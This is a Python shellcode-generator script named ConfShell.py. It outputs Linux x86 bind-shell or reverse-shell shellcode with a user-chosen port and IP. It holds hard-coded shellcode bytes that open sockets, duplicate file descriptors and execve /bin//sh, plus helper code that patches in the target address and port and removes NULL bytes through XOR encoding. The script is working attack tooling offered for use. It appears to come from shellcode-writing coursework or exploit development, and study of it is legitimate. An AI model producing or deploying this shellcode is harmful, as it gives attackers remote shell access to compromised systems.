#!/usr/bin/python3
# Author: Michael Norris
# Usage: python3 ConfShell.py bind [BIND_PORT]
# Usage: python3 ConfShell.py reverse [IP] [LISTEN_PORT] 

import socket
import struct
import sys


def h2ns_port(port_int):  # 4444 -> 23596
    if 256 < port_int < 65536:
        if not port_int % 256 == 0:
            return socket.htons(port_int)
        else:
            print('[!] NULL byte in shellcode. Please select a port that is not evenly divisible by 256.')
            exit(1)
    else:
        print('[!] NULL byte in shellcode. Please select a port greater than 256.')
        exit(1)


def int2hex_port(port_int): # 4444 -> 23596 -> `0x5c11`
        return '0x' + '%04x' % h2ns_port(port_int)


def str2b_addr(addr_str): # '127.0.0.1' -> b'\x7f\x00\x00\x01'
    return socket.inet_aton(str(addr_str))


def int2b_addr(addr_int): # 2130706433 -> b'\x7f\x00\x00\x01'
    return struct.pack('!L', addr_int)


def str2int_addr(addr_str): # '127.0.0.1' -> b'\x7f\x00\x00\x01' ->  2130706433
    return int.from_bytes(str2b_addr(addr_str), "big")


def int2str_addr(addr_int): # 2130706433 -> b'\x7f\x00\x00\x01' -> 127.0.0.1
    return socket.inet_ntoa(int2b_addr(addr_int))


def str2nl_addr(addr_str): # '127.0.0.1' -> b'\x7f\x00\x00\x01' ->  2130706433 -> 16777343
    return socket.htonl(str2int_addr(addr_str))


def str2hex_addr(addr_str): # '127.0.0.1' -> b'\x7f\x00\x00\x01' ->  2130706433 -> 16777343 -> '0x0100007f'
    return '0x' + '%08x' % str2nl_addr(addr_str)


def str2int_diff_addr(addr_str1, addr_str2): # subtracts two addr_str values after conversion to type int via str2int_addr()
    if str2int_addr(addr_str1) >= str2int_addr(addr_str2):
        return (str2int_addr(addr_str1) - str2int_addr(addr_str2))
    else:
        print('[!] addr_str2 is greater than addr_str1.')
        exit(1)


def str2bytelist_addr(addr_str): # '127.0.0.1' -> '0100007f' -> ['01', '00', '00', '7f']
    n = 2
    b_string = str2hex_addr(addr_str)[2:]
    return [b_string[i:i+n] for i in range(0, len(b_string), n)]


def int2sc_port(port_int):
    b_string = int2hex_port(port_int)[2:]
    temp = "\\x{b2}\\x{b1}"
    return temp.format(b2 = b_string[2:], b1 = b_string[:2])


def str2sclist_addr(addr_str):
    n = 4
    sc_string = gen_chosen_dark_sc(addr_str)
    return [sc_string[i:i+n] for i in range(0, len(sc_string), n)]


def sc2list_addr(addr_sc):
    n = 4
    return [addr_sc[i:i+n] for i in range(0, len(addr_sc), n)]


def str2sc_addr(addr_str):
    b_list = str2bytelist_addr(addr_str)
    temp = "\\x{b4}\\x{b3}\\x{b2}\\x{b1}"
    return temp.format(b4 = b_list[3], b3 = b_list[2], b2 = b_list[1], b1 = b_list[0])


def gen_chosen_dark_sc(addr_str):
    xor_addr = "255.255.255.255"
    chosen_dark = int2str_addr(str2int_diff_addr(xor_addr, addr_str))
    return str2sc_addr(chosen_dark)


def check_dark_sc_addr(addr_str):
    chosen_dark_sc = gen_chosen_dark_sc(addr_str)
    if chosen_dark_sc.find("\\x00") == -1:
        return False
    else:
        return True


def replace_00_dark_sc(addr_str):
    i = 0
    dark_sc_list = str2sclist_addr(addr_str)
    for sc_str in dark_sc_list:
        if sc_str == "\\x00":
            dark_sc_list[i] = "\\x01"
        i += 1
    return "".join(dark_sc_list)


def replace_ff_xor_sc(addr_str):
    i = 0
    xor_addr = "255.255.255.255"
    xor_addr_sc_list = sc2list_addr(str2sc_addr(xor_addr))
    dark_sc_list = sc2list_addr(replace_00_dark_sc(addr_str))
    for sc_str in dark_sc_list:
        if sc_str == "\\x01":
            xor_addr_sc_list[i] = "\\xfe"
        i += 1
    return "".join(xor_addr_sc_list)


def replace_sc(sc, port_int):
    base_port_sc = "\\x11\\x5c"
    chosen_port_sc = int2sc_port(port_int)
    return sc.replace(base_port_sc, chosen_port_sc)


def replace_sc1(sc, addr_str, port_int):
    base_dark_sc = "\\x80\\xff\\xff\\xfe"
    base_port_sc = "\\x11\\x5c"
    chosen_dark_sc = gen_chosen_dark_sc(addr_str)
    chosen_port_sc = int2sc_port(port_int)
    r1 = sc.replace(base_dark_sc, chosen_dark_sc)
    r2 = r1.replace(base_port_sc, chosen_port_sc)
    return r2


def replace_sc2(sc, addr_str, port_int):
    base_xor_sc = "\\xff\\xff\\xff\\xff"
    base_dark_sc = "\\x80\\xff\\xff\\xfe"
    base_port_sc = "\\x11\\x5c"
    chosen_xor_sc = replace_ff_xor_sc(addr_str)
    chosen_dark_sc = replace_00_dark_sc(addr_str)
    chosen_port_sc = int2sc_port(port_int)
    r1 = sc.replace(base_xor_sc, chosen_xor_sc)
    r2 = r1.replace(base_dark_sc, chosen_dark_sc)
    r3 = r2.replace(base_port_sc, chosen_port_sc)
    return r3


def bind_replace():
    print(replace_sc(bind_sc, chosen_port))


def reverse_replace():
    if not check_dark_sc_addr(chosen_light):
        print(replace_sc1(rev_sc, chosen_light, chosen_port))
    else:
        print(replace_sc2(rev_sc, chosen_light, chosen_port))


def check_option(option):
    if sys.argv[1] == 'bind':
        return "Bind"
    elif sys.argv[1] == 'reverse':
        return "Reverse"


if len(sys.argv) == 1:
    print('[*] Usage: python3 {filename} bind [BIND_PORT]'.format(filename = sys.argv[0]))
    print('[*] Usage: python3 {filename} reverse [IP] [LISTEN_PORT]'.format(filename = sys.argv[0]))
    exit(1)

if check_option(sys.argv[1]) == "Bind":
    if not len(sys.argv) == 3:
        print('[*] Usage: python3 {filename} bind [BIND_PORT]'.format(filename = sys.argv[0]))
        exit(1)
    bind_sc = ""
    bind_sc += "\\x31\\xd2\\x31\\xc9\\x31\\xdb\\x31\\xc0"
    bind_sc += "\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xfe"
    bind_sc += "\\xc3\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x52"
    bind_sc += "\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89"
    bind_sc += "\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xfe"
    bind_sc += "\\xc3\\xb0\\x66\\xcd\\x80\\x52\\x56\\x89"
    bind_sc += "\\xe1\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x52"
    bind_sc += "\\x52\\x56\\x89\\xe1\\xfe\\xc3\\xb0\\x66"
    bind_sc += "\\xcd\\x80\\x89\\xd1\\x89\\xc3\\xb0\\x3f"
    bind_sc += "\\xcd\\x80\\xfe\\xc1\\xb0\\x3f\\xcd\\x80"
    bind_sc += "\\xfe\\xc1\\xb0\\x3f\\xcd\\x80\\x52\\x68"
    bind_sc += "\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69"
    bind_sc += "\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89"
    bind_sc += "\\xe1\\xb0\\x0b\\xcd\\x80"
    chosen_port = int(sys.argv[2])
    bind_replace()
elif check_option(sys.argv[1]) == "Reverse":
    if not len(sys.argv) == 4:
        print('[*] Usage: python3 {filename} reverse [IP] [LISTEN_PORT]'.format(filename = sys.argv[0]))
        exit(1)
    rev_sc = ""
    rev_sc += "\\x31\\xdb\\xf7\\xe3\\x52\\x6a\\x01\\x6a"
    rev_sc += "\\x02\\x89\\xe1\\xfe\\xc3\\xb0\\x66\\xcd"
    rev_sc += "\\x80\\x89\\xc3\\xbf\\xff\\xff\\xff\\xff"
    rev_sc += "\\xb9\\x80\\xff\\xff\\xfe\\x31\\xf9\\x51"
    rev_sc += "\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89"
    rev_sc += "\\xe1\\x6a\\x10\\x51\\x53\\x89\\xe1\\xb0"
    rev_sc += "\\x66\\xcd\\x80\\x89\\xd1\\xb0\\x3f\\xcd"
    rev_sc += "\\x80\\xfe\\xc1\\xb0\\x3f\\xcd\\x80\\xfe"
    rev_sc += "\\xc1\\xb0\\x3f\\xcd\\x80\\x52\\x68\\x2f"
    rev_sc += "\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
    rev_sc += "\\x89\\xd1\\x89\\xe3\\xb0\\x0b\\xcd\\x80"
    chosen_light = sys.argv[2]
    chosen_port = int(sys.argv[3])
    reverse_replace()
else:
    print('[*] Usage: python3 {filename} bind [BIND_PORT]'.format(filename = sys.argv[0]))
    print('[*] Usage: python3 {filename} reverse [IP] [LISTEN_PORT]'.format(filename = sys.argv[0]))
    exit(1)
